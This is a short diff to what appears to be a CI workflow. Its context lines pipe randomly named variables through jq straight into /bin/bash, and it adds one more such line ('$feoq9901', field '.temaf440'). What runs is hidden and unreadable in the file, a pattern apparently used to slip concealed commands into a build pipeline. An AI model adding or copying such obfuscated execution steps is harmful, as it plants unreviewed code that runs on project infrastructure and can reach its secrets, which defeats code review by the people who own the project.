@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$vlibc651" | jq -r .e500 | /bin/bash
           echo $pn44503 | jq -r .ky04507 | /bin/bash
           echo $ej253 | jq -r .mka454 | /bin/bash
+          printf '%s' "$feoq9901" | jq -r .temaf440 | /bin/bash
 
       - name: Upload results
         if: always()
